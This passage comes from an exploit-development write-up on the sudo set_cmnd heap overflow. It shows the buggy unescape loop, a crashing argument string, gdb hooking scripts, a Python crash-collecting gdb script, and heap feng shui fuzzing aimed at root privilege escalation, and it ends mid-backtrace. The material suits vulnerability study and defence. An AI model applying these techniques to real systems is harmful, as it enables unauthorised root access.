(from = *av); av++) { 884: while (*from) { 885: if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) 886: from++; 887: *to++ = *from++; //offending line 888: } 889: *to++ = \u0026#39; \u0026#39;; 890: } further analysis now we have found the bug! we can dig deeper to figure out \u0026ldquo;why\u0026rdquo; there is a bug in that source code snippter above. well, the for-loop simply copites newargv (which is a partial copy of argv) to user_args. during the copy, if it finds a backslash, it skips it and copies the next character, kinda like unescaping things. however, if the last character of an argument is a backslash, then the next character is a null byte, and from will be increased twice before being checked in the while condition. so, the while loop will keep copying past the terminating null byte.\nwe can load the program and the crashing input to gdb to analyze the bug further and can also add some more printfs:\ndiff --git a/plugins/sudoers/sudoers.c b/plugins/sudoers/sudoers.c index 6c5bcfd..843d0dc 100644 --- a/plugins/sudoers/sudoers.c +++ b/plugins/sudoers/sudoers.c @@ -848,9 +852,16 @@ set_cmnd(void) char *to, *from, **av; size_t size, n; + fprintf(stderr, \u0026#34;newargc=%d\\n\u0026#34;, newargc); + for(int i=0; i\u0026lt;newargc; i++) { + fprintf(stderr, \u0026#34;newargv[%d]=%p=%s\\n\u0026#34;, i, newargv[i], newargv[i]); + } /* alloc and build up user_args. */ for (size = 0, av = newargv + 1; *av; av++) size += strlen(*av) + 1; + fprintf(stderr, \u0026#34;size=0x%lx\\n\u0026#34;, size); + if (size == 0 || (user_args = malloc(size)) == null) { sudo_warnx(u_(\u0026#34;%s: %s\u0026#34;), __func__, u_(\u0026#34;unable to allocate memory\u0026#34;)); debug_return_int(-1); @@ -861,11 +872,19 @@ set_cmnd(void) * escapes potential meta chars. we unescape non-spaces * for sudoers matching and logging purposes. */ + // `from` points to: argv-fuzz-inl.h:afl_init_argv.in_buf+xx `static` buffer for (to = user_args, av = newargv + 1; (from = *av); av++) { while (*from) { if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) from++; - *to++ = *from++; + *to++ = *from++; //offending line } *to++ = \u0026#39; \u0026#39;; } exploitation okay so now we understand the bug pretty well. let\u0026rsquo;s see if we can exploit the bug to escalate privileges.\nexploitation strategy our exploitation strategy here is pretty limited. this is a \u0026ldquo;one-shot\u0026rdquo; exploit. our only interactions with sudo are the argv and environment variables. afterwards, we run and and have no interaction with the binary until the memory corruption happens. this means that we do not have leaks. at best we can do partial address overwrites and data-only attacks.\nsince we have a heap overflow, we need to manipulate the layout of the heap (heap feng shui) so that there is an \u0026ldquo;interesting\u0026rdquo; adjuscent chucnk where we overflow into. to do so, we write our own heap fuzzer. there are various reasons why we do not use afl++:\nafl++ instrumentation passes and runtime affect heap feng shui in a negative way. if we find an interesting heap layout with afl++, this will not be reproducible in the original binary. we want to be as close to the original binary as possible. ideally, we wouldn\u0026rsquo;t recompile the binary and instead fuzz it as it is supposed to run on a system. we want to fuzz on the input size. we do not care about the contents. we do not care about code coverage. we want to fuzz environment variables also. the deal-breaker here is point 1. afl++ would mess up the heap layout too much. instead, we will write our own heap fuzzer in python and use gdb to analyze information from crashes. (or at least i am incomptenet enough apply afl++ for this task.)\nidentifying inputs first, we do some analysis. we need to figure our which of our inputs cotonrol our allocations. basically we want to do taint analysis, where our sources are input lengths (argc, argv, envp) and our sinks are the size argument to malloc/calloc calls. i am unaware of some taint analysis framework that can automagically (and without significant engineering effort) tell us this information. so, let\u0026rsquo;s go with ad-hoc gdb analysis and source code review instead:\n//total size of argv //sudoers.c:set_cmnd /* alloc and build up user_args. */ for (size = 0, av = newargv + 1; *av; av++) size += strlen(*av) + 1; fprintf(stderr, \u0026#34;size=0x%lx\\n\u0026#34;, size); if (size == 0 || (user_args = malloc(size)) == null) // total size of env // env.c:env_init len = (size_t)(ep - envp); env.env_size = len + 1 + 128; env.envp = reallocarray(null, env.env_size, sizeof(char *)); we further gather information at runtime. we use a simple gdb script that hooks malloc and calloc calls and dumps a backtrace:\n# gdbscript that hooks all allocations # we use vanila gdb with `--nh` # we use `stdbuf`, otherwise some input is omitted # run as: # stdbuf -o 0 gdb ./0edit -x startup.2.gdb -iex \u0026#39;set pagination off\u0026#39; -q --nh \u0026gt; startup.2.gdb.out 2\u0026gt;\u0026amp;1 add-symbol-file /usr/local/libexec/sudo/libsudo_util.so.0 add-symbol-file /usr/local/libexec/sudo/sudoers.so # crashing input: set args -hb -i aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\\\ bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb start b *malloc command $bpnum bt continue end b *calloc command $bpnum bt continue end continue at the backtrace we can look for strings that we know belong to our input. but which inputs shall we manipulate besides argv? let\u0026rsquo;s also gather potential environment variables that get accessed by sudo by inserting a breakpoint at getenv. this is not foolproof as unset env variables and env variables accessed via envp will be missed. still, here is the script and the output list:\nb getenv command $bpnum silent printf \u0026#34;getenv called: %s\\n\u0026#34;, (char*)$rdi continue end results:\ngconv_path lang lc_address lc_all lc_collate lc_ctype lc_identification lc_measurement lc_messages lc_monetary lc_name lc_numeric lc_paper lc_telephone lc_time locpath shell tz (note: when running gdb for automated tasks like this, it is good to disable any plugins such as gef or pwndbg. experience has shown that these plugins throw weird errors when breakpoints are hit and continued in a non-interactive way.)\nnow, we can set those environment variables one-by-one and examine the backtraces (through the same gdbscript from above) to see if they affect allowcations:\n// `gconv_path`. various paths have been created breakpoint 3, __gi___libc_malloc (bytes=bytes@entry=62) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=bytes@entry=62) at ./malloc/malloc.c:3288 #1 0x00007a8a00d06bfd in gconv_parseconfdir (dir_len=46, dir=0x593a49a7fa20 \u0026#34;/home/user/mount/sudoedit/02-exploit/qqqqqqqq/\u0026#34;, prefix=0x0) at ./gconv_parseconfdir.h:125 #2 __gconv_read_conf () at ./iconv/gconv_conf.c:480 #3 0x00007a8a00d6af97 in __pthread_once_slow (once_control=0x7a8a00eb0a4c \u0026lt;once\u0026gt;, init_routine=0x7a8a00d06b50 \u0026lt;__gconv_read_conf\u0026gt;) at ./nptl/pthread_once.c:116 #4 0x00007a8a00d6b075 in ___pthread_once (once_control=\u0026lt;optimized out\u0026gt;, init_routine=\u0026lt;optimized out\u0026gt;) at ./nptl/pthread_once.c:143 #5 0x00007a8a00d06e53 in __gconv_load_conf () at ./iconv/gconv_conf.c:528 #6 0x00007a8a00d05b79 in __gconv_compare_alias (name1=name1@entry=0x7fff767b8bb0 \u0026#34;utf-8//\u0026#34;, name2=name2@entry=0x7fff767b8bc0 \u0026#34;utf-8//\u0026#34;) at ./iconv/gconv_db.c:707 #7 0x00007a8a00d0fcbe in _nl_find_locale (locale_path=\u0026lt;optimized out\u0026gt;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7fff767b8cb0) at ../iconv/gconv_charset.h:87 #8 0x00007a8a00d0f38c in __gi_setlocale (category=0, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:337 #9 0x0000593a489d5417 in main (argc=5, argv=0x7fff767b9098, envp=0x7fff767b90c8) at ./sudo.c:192 breakpoint 3, __gi___libc_malloc (bytes=bytes@entry=472) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=bytes@entry=472) at ./malloc/malloc.c:3288 #1 0x00007a8a00d531fb in __fopen_internal (filename=filename@entry=0x593a49a7fa80 \u0026#34;/home/user/mount/sudoedit/02-exploit/qqqqqqqq/gconv-modules\u0026#34;, mode=mode@entry=0x7a8a00e729d4 \u0026#34;rce\u0026#34;, is32=is32@entry=1) at ./libio/iofopen.c:65 #2 0x00007a8a00d532da in _io_new_fopen (filename=filename@entry=0x593a49a7fa80 \u0026#34;/home/user/mount/sudoedit/02-exploit/qqqqqqqq/gconv-modules\u0026#34;, mode=mode@entry=0x7a8a00e729d4 \u0026#34;rce\u0026#34;) at ./libio/iofopen.c:86 #3 0x00007a8a00d06874 in read_conf_file (filename=filename@entry=0x593a49a7fa80 \u0026#34;/home/user/mount/sudoedit/02-exploit/qqqqqqqq/gconv-modules\u0026#34;, directory=directory@entry=0x593a49a7fa20 \u0026#34;/home/user/mount/sudoedit/02-exploit/qqqqqqqq/\u0026#34;, dir_len=dir_len@entry=46) at ./gconv_parseconfdir.h:55 #4 0x00007a8a00d06c3d in gconv_parseconfdir (dir_len=46, dir=0x593a49a7fa20 \u0026#34;/home/user/mount/sudoedit/02-exploit/qqqqqqqq/\u0026#34;, prefix=0x0) at ./gconv_parseconfdir.h:139 #5 __gconv_read_conf () at ./iconv/gconv_conf.c:480 #6 0x00007a8a00d6af97 in __pthread_once_slow (once_control=0x7a8a00eb0a4c \u0026lt;once\u0026gt;, init_routine=0x7a8a00d06b50 \u0026lt;__gconv_read_conf\u0026gt;) at ./nptl/pthread_once.c:116 #7 0x00007a8a00d6b075 in ___pthread_once (once_control=\u0026lt;optimized out\u0026gt;, init_routine=\u0026lt;optimized out\u0026gt;) at ./nptl/pthread_once.c:143 #8 0x00007a8a00d06e53 in __gconv_load_conf () at ./iconv/gconv_conf.c:528 #9 0x00007a8a00d05b79 in __gconv_compare_alias (name1=name1@entry=0x7fff767b8bb0 \u0026#34;utf-8//\u0026#34;, name2=name2@entry=0x7fff767b8bc0 \u0026#34;utf-8//\u0026#34;) at ./iconv/gconv_db.c:707 #10 0x00007a8a00d0fcbe in _nl_find_locale (locale_path=\u0026lt;optimized out\u0026gt;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7fff767b8cb0) at ../iconv/gconv_charset.h:87 #11 0x00007a8a00d0f38c in __gi_setlocale (category=0, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:337 #12 0x0000593a489d5417 in main (argc=5, argv=0x7fff767b9098, envp=0x7fff767b90c8) at ./sudo.c:192 // `progname` // we can use arbitrary slashes. for example `./////////0edit` breakpoint 3, __gi___libc_malloc (bytes=520) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=520) at ./malloc/malloc.c:3288 #1 0x00007fab651077c6 in sudo_new_key_val_v1 (key=0x5c947f13ae53 \u0026#34;progname\u0026#34;, val=0x7ffc7d7c590e \u0026#34;.\u0026#34;, \u0026#39;/\u0026#39; \u0026lt;repeats 199 times\u0026gt;...) at ./key_val.c:53 #2 0x00005c947f131a70 in format_plugin_settings (plugin=0x5c947f143920 \u0026lt;policy_plugin\u0026gt;, sudo_settings=0x5c947f141840 \u0026lt;sudo_settings\u0026gt;) at ./sudo.c:1068 #3 0x00005c947f131d19 in policy_open (plugin=0x5c947f143920 \u0026lt;policy_plugin\u0026gt;, settings=0x5c947f141840 \u0026lt;sudo_settings\u0026gt;, user_info=0x5c9480455ca0, user_env=0x7ffc7d7c51c8) at ./sudo.c:1104 #4 0x00005c947f12d6eb in main (argc=5, argv=0x7ffc7d7c5198, envp=0x7ffc7d7c51c8) at ./sudo.c:255 // `lc_ctype` indeed affects allocations. one time we set it at 8 bytes length and saw allocations of size 34 // and the other time we set it at 16 bytes length, seeing allocations of size 42. //lc_ctype=qqqqqqqq (length 8) breakpoint 3, __gi___libc_malloc (bytes=bytes@entry=34) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=bytes@entry=34) at ./malloc/malloc.c:3288 #1 0x000074c6c8124d8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x74c6c82bfac0 \u0026lt;_nl_locale_file_list\u0026gt;, dirlist=dirlist@entry=0x74c6c828af50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, dirlist_len=dirlist_len@entry=16, mask=mask@entry=0, language=0x7ffcd7b0d250 \u0026#34;qqqqqqqq\u0026#34;, territory=0x0, codeset=0x0, normalized_codeset=0x0, modifier=0x0, filename=0x74c6c826746b \u0026lt;_nl_category_names+11\u0026gt; \u0026#34;lc_ctype\u0026#34;, do_allocate=0) at ../intl/l10nflist.c:166 #2 0x000074c6c811eb3c in _nl_find_locale (locale_path=0x74c6c828af50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffcd7b0d340) at ./locale/findlocale.c:204 #3 0x000074c6c811e38c in __gi_setlocale (category=0, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:337 #4 0x0000588355d46417 in main (argc=5, argv=0x7ffcd7b0d728, envp=0x7ffcd7b0d758) at ./sudo.c:192 breakpoint 3, __gi___libc_malloc (bytes=bytes@entry=34) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=bytes@entry=34) at ./malloc/malloc.c:3288 #1 0x000074c6c8124d8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x74c6c82bfac0 \u0026lt;_nl_locale_file_list\u0026gt;, dirlist=dirlist@entry=0x74c6c828af50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, dirlist_len=dirlist_len@entry=16, mask=mask@entry=0, language=0x7ffcd7b0d250 \u0026#34;qqqqqqqq\u0026#34;, territory=0x0, codeset=0x0, normalized_codeset=0x0, modifier=0x0, filename=0x74c6c826746b \u0026lt;_nl_category_names+11\u0026gt; \u0026#34;lc_ctype\u0026#34;, do_allocate=1) at ../intl/l10nflist.c:166 #2 0x000074c6c811efbf in _nl_find_locale (locale_path=0x74c6c828af50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffcd7b0d340) at ./locale/findlocale.c:214 #3 0x000074c6c811e38c in __gi_setlocale (category=0, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:337 #4 0x0000588355d46417 in main (argc=5, argv=0x7ffcd7b0d728, envp=0x7ffcd7b0d758) at ./sudo.c:192 //lc_ctype=qqqqqqqqqqqqqqqq (length 16) breakpoint 3, __gi___libc_malloc (bytes=bytes@entry=42) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=bytes@entry=42) at ./malloc/malloc.c:3288 #1 0x000076cd707efd8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x76cd7098aac0 \u0026lt;_nl_locale_file_list\u0026gt;, dirlist=dirlist@entry=0x76cd70955f50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, dirlist_len=dirlist_len@entry=16, mask=mask@entry=0, language=0x7ffc1e839f00 \u0026#39;q\u0026#39; \u0026lt;repeats 16 times\u0026gt;, territory=0x0, codeset=0x0, normalized_codeset=0x0, modifier=0x0, filename=0x76cd7093246b \u0026lt;_nl_category_names+11\u0026gt; \u0026#34;lc_ctype\u0026#34;, do_allocate=0) at ../intl/l10nflist.c:166 #2 0x000076cd707e9b3c in _nl_find_locale (locale_path=0x76cd70955f50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffc1e839ff0) at ./locale/findlocale.c:204 #3 0x000076cd707e938c in __gi_setlocale (category=0, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:337 #4 0x000059fa11824417 in main (argc=5, argv=0x7ffc1e83a3d8, envp=0x7ffc1e83a408) at ./sudo.c:192 breakpoint 3, __gi___libc_malloc (bytes=bytes@entry=42) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=bytes@entry=42) at ./malloc/malloc.c:3288 #1 0x000076cd707efd8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x76cd7098aac0 \u0026lt;_nl_locale_file_list\u0026gt;, dirlist=dirlist@entry=0x76cd70955f50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, dirlist_len=dirlist_len@entry=16, mask=mask@entry=0, language=0x7ffc1e839f00 \u0026#39;q\u0026#39; \u0026lt;repeats 16 times\u0026gt;, territory=0x0, codeset=0x0, normalized_codeset=0x0, modifier=0x0, filename=0x76cd7093246b \u0026lt;_nl_category_names+11\u0026gt; \u0026#34;lc_ctype\u0026#34;, do_allocate=1) at ../intl/l10nflist.c:166 #2 0x000076cd707e9fbf in _nl_find_locale (locale_path=0x76cd70955f50 \u0026lt;_nl_default_locale_path\u0026gt; \u0026#34;/usr/lib/locale\u0026#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffc1e839ff0) at ./locale/findlocale.c:214 #3 0x000076cd707e938c in __gi_setlocale (category=0, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:337 #4 0x000059fa11824417 in main (argc=5, argv=0x7ffc1e83a3d8, envp=0x7ffc1e83a408) at ./sudo.c:192 //`tz` breakpoint 3, __gi___libc_malloc (bytes=bytes@entry=9) at ./malloc/malloc.c:3288 3288\tin ./malloc/malloc.c #0 __gi___libc_malloc (bytes=bytes@entry=9) at ./malloc/malloc.c:3288 #1 0x00007e5089f6c8ea in __gi___strdup (s=s@entry=0x7ffdfcad7eed \u0026#34;qqqqqqqq\u0026#34;) at ./string/strdup.c:42 #2 0x00007e5089f93002 in tzset_internal (always=always@entry=1) at ./time/tzset.c:402 #3 0x00007e5089f931ff in __tzset () at ./time/tzset.c:551 #4 0x000059e2f38b8444 in main (argc=5, argv=0x7ffdfcad76a8, envp=0x7ffdfcad76d8) at ./sudo.c:196 // locpath (actually affects a lot. 101 locations) writing a heap feng shui fuzzer so, let\u0026rsquo;s write our fuzzer now. our fuzzer will run the sudo binary with argv and environment variable inputs of various lengths. the arguments will always trigger the heap overflow so that we eventually crash. with gdb, we will hook all stop evenets, meaning signals such as sigabrt and sigsegv. when the inferior stops due to a crash, we will collect backtrace infromation regarding where the crash happened so that we can inspect afterwards if the location of the crash is interesting or not.\nhere is our gdbscript that is capable of collecting information upon crashes:\nimport gdb has_pwndbg=false #todo: detect dynamically inf = gdb.inferiors()[0] gdb.execute(\u0026#39;add-symbol-file /usr/local/libexec/sudo/libsudo_util.so.0\u0026#39;) gdb.execute(\u0026#39;add-symbol-file /usr/local/libexec/sudo/sudoers.so\u0026#39;) # gdb events: # https://sourceware.org/gdb/current/onlinedocs/gdb.html/events-in-python.html def exit_handler(event: gdb.exitedevent): # called when the inferior exits if hasattr(event, \u0026#39;exit_code\u0026#39;): print(f\u0026#34;inferior exited. exit code: {event.exit_code}\u0026#34;) else: print(\u0026#34;inferior exited. exit code: unavailable\u0026#34;) gdb.execute(\u0026#39;quit\u0026#39;) gdb.events.exited.connect(exit_handler) def stop_handler(event: gdb.stopevent): print(\u0026#34;inferior stopped: \u0026#34; + str(type(event))) if has_pwndbg: gdb.execute(\u0026#39;set context-output stdout\u0026#39;) output = \u0026#39;\u0026#39; output += \u0026#39;stop reason:\\n\u0026#39; if isinstance(event, gdb.signalevent): output += event.stop_signal + \u0026#39;\\n\u0026#39; else: output += str(type(event)) + \u0026#39;\\n\u0026#39; output += \u0026#39;context:\\n\u0026#39; if has_pwndbg: output += gdb.execute(\u0026#39;context\u0026#39;, to_string=true) output += \u0026#39;environment:\\n\u0026#39; output += gdb.execute(\u0026#39;show environment\u0026#39;, to_string=true) output += \u0026#39;bt:\\n\u0026#39; output += gdb.execute(\u0026#39;bt\u0026#39;, to_string=true) print(output) gdb.execute(\u0026#39;kill\u0026#39;) gdb.events.stop.connect(stop_handler) gdb.execute(\u0026#34;r\u0026#34;) next we write our fuzzer which does the following things on a high-level:\ngenerates random input (for all argc, argv, and envp) invokes gdb and executes the above gdbscript. at this point, we decide to run sudo as root in order to be able to spawn it with gdb since it is a setuid program. alternatively, we could have modified the sudo binary to do a read(0, buf, 1) during startup. in this way we could run sudo as user, attach to it with gdb, and then continue execution. retrospectively, it was a bad decision to run sudo as root as we will observe at the end of the blog post (no spoilers!) collect the output from gdb for runs that crashed (memory corruption) prase the output store the results to a json file for further analysis each crash is stored in its own json file the implementation of the fuzzer is in heap-fuzzer.py. and, honsetly, this is probably some very low quality dumb material as it simply throws random stuff at the binary and does not use any feedback to guide the fuzzer further.\nwe disable aslr system-wide and run the fuzzer. aaaaand let it run there for a few hours\u0026hellip; in the mean time, we also write a parser for our results.\nauto-analyzing crashes the heap-results-analyzer.py script is nothing fancy. it simply loads all the crashes, gathers statistics, and prints all the unique crashes that we discovered. we classify two crashes as identical when their backtrace information is the same. ideally, this would be the case when (a) the number of frames in the backtrace is the same and (b) for each frame, comparing the address across crashes matches. for example, the following two crashes are identical:\n// crash 1: #0 0x00007ffff7e4ffaf in unlink_chunk (p=p@entry=0x5555555935e0, av=0x7ffff7f8dc60 \u0026lt;main_arena\u0026gt;) at ./malloc/malloc.c:1622 #1 0x00007ffff7e52dcd in _int_malloc (av=av@entry=0x7ffff7f8dc60 \u0026lt;main_arena\u0026gt;, bytes=bytes@entry=3507) at ./malloc/malloc.c:4303 #2 0x00007ffff7e539fa in __gi___libc_malloc (bytes=bytes@entry=3507) at ./malloc/malloc.c:3315 #3 0x00007ffff7e5615c in __argz_create_sep (string=0x7fffffffe1b7 \u0026#39;o\u0026#39; \u0026lt;repeats 200 times\u0026gt;..., delim=delim@entry=58, argz=argz@entry=0x7fffffffd790, len=len@entry=0x7fffffffd798) at ./string/argz-ctsep.c:34 #4 0x00007ffff7ded511 in __gi_setlocale (category=6, locale=0x555555591e10 \u0026#34;c\u0026#34;) at ./locale/setlocale.c:255 ... // crash 2: #0 0x00007ffff7e4ffaf in unlink_chunk (p=p@entry=0x5555555935e0, av=0x7ffff7f8dc60 \u0026lt;main_arena\u0026gt;) at ./malloc/malloc.c:1622 #1 0x00007ffff7e52dcd in _int_malloc (av=av@entry=0x7ffff7f8dc60 \u0026lt;main_arena\u0026gt;, bytes=bytes@entry=3507) at ./malloc/malloc.c:4303 #2 0x00007ffff7e539fa in __gi___libc_malloc (bytes=bytes@entry=3507) at ./malloc/malloc.c:3315 #3 0x00007ffff7e5615c in __argz_create_sep (string=0x7fffffffe1b7 \u0026#39;p\u0026#39; \u0026lt;repeats 200 times\u0026gt;..., delim=delim@entry=58, argz=argz@entry=0x7fffffffd790, len=len@entry=0x7fffffffd798) at ./string/argz-ctsep.c:34 #4 0x00007ffff7ded511 in __gi_setlocale (category=6, locale=0x555555591e10 \u0026#34;c\u0026#34;) at ./locale/setlocale.c:255 ... you see, the number of frames (4) and the addresses match. we do not care that the arguments are different (e.g. 'o' \u0026lt;repeats 200 times\u0026gt; vs 'p' \u0026lt;repeats 200 times\u0026gt; in __argz_create_sep).\nsince i had to recompile the binary mid-way fuzzing because of dumb reasons, i chose a bit more coarse grained approach for identifying idnetical crashes. instead of comparing the address, we compare the pair \u0026lt;funcname\u0026gt;, \u0026lt;source-location\u0026gt;. so for example __gi_setlocale, ./locale/setlocale.c:255. (still you might argue that source line might change if i introduced changes to the source, but i took my risks there. i could have used only the function name but then i could have missed some crashes. again, ideally we should be comparing addresses.)\nafter half a million crashes (565233 to be precise), and some successful executions, we run our results-analyzer and identify 161 unique crashes. the results are stored in heap-results-analyzer.out. here is some sample output from our analyzer:\ncount: 5 files: inp.474439, inp.489563, inp.513194, inp.540647, inp.560127 #0 0x00007ffff7d2251b in sudoers_policy_main (argc=6, argv=0x7fffffffec18, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffe8a0) at ./sudoers.c:572 #1 0x00007ffff7d1ca7c in sudoers_policy_check (argc=6, argv=0x7fffffffec18, env_add=0x0, command_infop=0x7fffffffe988, argv_out=0x7fffffffe990, user_env_out=0x7fffffffe998) at ./policy.c:872 #2 0x0000555555572f88 in policy_check (plugin=0x555555583920 \u0026lt;policy_plugin\u0026gt;, argc=6, argv=0x7fffffffec18, env_add=0x0, command_info=0x7fffffffe988, argv_out=0x7fffffffe990, user_env_out=0x7fffffffe998) at ./sudo.c:1186 #3 0x000055555556e6ed in main (argc=8, argv=0x7fffffffec08, envp=0x7fffffffec50) at ./sudo.c:301 ... count: 1 files: inp.562039 #0 __pthread_kill_implementation (threadid=\u0026lt;optimized out\u0026gt;, signo=signo@entry=6, no_tid=no_tid@entry=0) at ./nptl/pthread_kill.c:44 #1 0x00007ffff7e45e8f in __pthread_kill_internal (signo=6, threadid=\u0026lt;optimized out\u0026gt;) at ./nptl/pthread_kill.c:78 #2 0x00007ffff7df6fb2 in __gi_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26 #3 0x00007ffff7de1472 in __gi_abort () at ./stdlib/abort.c:79 #4 0x00007ffff7e3a430 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7f54459 \u0026#34;%s\\n\u0026#34;) at ../sysdeps/posix/libc_fatal.c:155 #5 0x00007ffff7e4f7aa in malloc_printerr (str=str@entry=0x7ffff7f57138 \u0026#34;double free or corruption (out)\u0026#34;) at ./malloc/malloc.c:5660 #6 0x00007ffff7e51810 in _int_free (av=0x7ffff7f8dc60 \u0026lt;main_arena\u0026gt;, p=0x555555585bb0, have_lock=\u0026lt;optimized out\u0026gt;, have_lock@entry=0) at ./malloc/malloc.c:4584 #7 0x00007ffff7e53e8f in __gi___libc_free (mem=\u0026lt;optimized out\u0026gt;) at ./malloc/malloc.c:3385 #8 0x00007ffff7ded799 in setname (name=0x7ffff7f5247c \u0026lt;_nl_c_name\u0026gt; \u0026#34;c\u0026#34;, category=6) at ./locale/setlocale.c:199 #9 __gi_setlocale (category=\u0026lt;optimized out\u0026gt;, locale=\u0026lt;optimized out\u0026gt;) at ./locale/setlocale.c:385 #10 0x00007ffff7d114e6 in sudoers_setlocale (newlocale=1, prevlocale=0x7fffffffe4fc) at ./locale.c:120 #11 0x00007ffff7d21753 in sudoers_policy_main (argc=25, argv=0x7fffffffe958, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffe5e0) at ./sudoers.c:327 #12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=25, argv=0x7fffffffe958, env_add=0x0, command_infop=0x7fffffffe6c8, argv_out=0x7fffffffe6d0, user_env_out=0x7fffffffe6d8) at ./policy.c:872 #13 0x0000555555572f88 in policy_check (plugin=0x555555583920 \u0026lt;policy_plugin\u0026gt;, argc=25, argv=0x7fffffffe958, env_add=0x0, command_info=0x7fffffffe6c8, argv_out=0x7fffffffe6d0, user_env_out=0x7fffffffe6d8) at ./sudo.c:1186 #14 0x000055555556e6ed in main (argc=27, argv=0x7fffffffe948, envp=0x7fffffffea28) at ./sudo.c:301 count: 2 files: inp.562435, inp.563143 #0 __pthread_kill_implementation (threadid=\u0026lt;optimized out\u0026gt;, signo=signo@entry=6, no_tid=no_tid@entry=0) at ./nptl/pthread_kill.c:44 #1 0x00007ffff7e45e8f in __pthread_kill_internal (signo=6, threadid=\u0026lt;optimized out\u0026gt;) at ./nptl/pthread_kill.c:78 #2 0x00007ffff7df6fb2 in __gi_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26 #3 0x00007ffff7de1472 in __gi_abort () at ./stdlib/abort.c:79 #4 0x00007ffff7e3a430 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7f54459 \u0026#34;%s\\n\u0026#34;) at ../sysdeps/posix/libc_fatal.c:155 #5 0x00007ffff7e4f7aa in malloc_printerr (str=str@entry=0x7ffff7f56bb8 \u0026#34;munmap_chunk(): invalid pointer\u0026#34;) at ./malloc/malloc.c:5660 #6 0x00007ffff7e4f96c in munmap_chunk (p=p@entry=0x5555555849a0) at ./malloc/malloc.c:3054 #7 0x00007ffff7e53ed8 in __gi___libc_free (mem=mem@entry=0x5555555849b0) at ./malloc/malloc.c:3375 #8 0x00007ffff7e30aa3 in _io_deallocate_file (fp=0x5555555849b0) at ./libio/libiop.h:862 #9 _io_new_fclose (fp=fp@entry=0x5555555849b0) at ./libio/iofclose.c:74 #10 0x00007ffff7ef5692 in __gi__nss_files_initgroups_dyn (user=user@entry=0x55555558a588 \u0026#34;root\u0026#34;, group=group@entry=0, 